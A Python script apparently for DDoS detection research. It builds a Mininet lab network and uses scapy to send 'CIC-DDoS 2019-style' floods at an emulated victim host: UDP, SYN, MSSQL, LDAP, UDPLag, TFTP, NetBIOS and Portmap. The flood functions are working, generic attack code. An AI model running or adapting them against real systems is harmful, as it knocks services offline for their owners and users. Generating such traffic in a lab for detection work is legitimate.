#!/home/deep/files/arf_ddos/venv/bin/python
from mininet.net import Mininet
from mininet.node import OVSSwitch, RemoteController
from mininet.topo import Topo
from mininet.log import setLogLevel, info
from scapy.all import IP, UDP, TCP, Raw, send
from random import randint
from functools import partial
import time

VICTIM = '10.0.0.1'


class SingleTopo(Topo):
    def build(self):
        h1 = self.addHost('h1')
        h2 = self.addHost('h2')
        s1 = self.addSwitch('s1')
        self.addLink(h1, s1)
        self.addLink(h2, s1)


def send_udp_flood(count=40000, dport=33434, payload_size=140):
    info(f"[UDP] sending {count} packets to {VICTIM}:{dport}\n")
    for i in range(count):
        pkt = IP(dst=VICTIM) / UDP(sport=randint(1024, 65535), dport=dport) / Raw(load=b'X' * payload_size)
        send(pkt, verbose=0)


def send_syn_flood(count=40000, dport=80):
    info(f"[SYN] sending {count} SYN packets to {VICTIM}:{dport}\n")
    for i in range(count):
        pkt = IP(dst=VICTIM) / TCP(sport=randint(1024, 65535), dport=dport, flags='S') / Raw(load=b'Y' * 40)
        send(pkt, verbose=0)


def send_mssql_flood(count=30000):
    info(f"[MSSQL] sending {count} UDP packets to {VICTIM}:1433\n")
    for i in range(count):
        pkt = IP(dst=VICTIM) / UDP(sport=randint(1024, 65535), dport=1433) / Raw(load=b'M' * 140)
        send(pkt, verbose=0)


def send_ldap_flood(count=30000):
    info(f"[LDAP] sending {count} UDP packets to {VICTIM}:389\n")
    for i in range(count):
        pkt = IP(dst=VICTIM) / UDP(sport=randint(1024, 65535), dport=389) / Raw(load=b'L' * 140)
        send(pkt, verbose=0)


def send_udplag_flood(count=25000):
    info(f"[UDPLAG] sending {count} UDP packets to {VICTIM}:33434\n")
    for i in range(count):
        pkt = IP(dst=VICTIM) / UDP(sport=randint(1024, 65535), dport=33434) / Raw(load=b'U' * 140)
        send(pkt, verbose=0)
        if i % 50 == 0:
            time.sleep(0.01)


def send_tftp_flood(count=25000):
    info(f"[TFTP] sending {count} UDP packets to {VICTIM}:69\n")
    for i in range(count):
        pkt = IP(dst=VICTIM) / UDP(sport=randint(1024, 65535), dport=69) / Raw(load=b'T' * 120)
        send(pkt, verbose=0)


def send_netbios_flood(count=25000):
    info(f"[NetBIOS] sending {count} UDP packets to {VICTIM}:137\n")
    for i in range(count):
        pkt = IP(dst=VICTIM) / UDP(sport=randint(1024, 65535), dport=137) / Raw(load=b'N' * 120)
        send(pkt, verbose=0)


def send_portmap_flood(count=25000):
    info(f"[PORTMAP] sending {count} UDP packets to {VICTIM}:111\n")
    for i in range(count):
        pkt = IP(dst=VICTIM) / UDP(sport=randint(1024, 65535), dport=111) / Raw(load=b'P' * 120)
        send(pkt, verbose=0)


if __name__ == '__main__':
    setLogLevel('info')
    net = Mininet(
        topo=SingleTopo(),
        controller=None,
        switch=partial(OVSSwitch, protocols='OpenFlow13'),
        autoSetMacs=True,
    )
    net.addController('c0', controller=RemoteController, ip='127.0.0.1', port=6653)
    net.start()
    try:
        info('=== CIC-DDoS 2019-style attack demo ===\n')
        info('Victim: h1, attacker: h2\n')
        send_udp_flood()
        # Uncomment one at a time to try different attack families:
        # send_syn_flood()
        # send_mssql_flood()
        # send_ldap_flood()
        # send_udplag_flood()
        # send_tftp_flood()
        # send_netbios_flood()
        # send_portmap_flood()
        info('Attack run complete.\n')
    finally:
        net.stop()
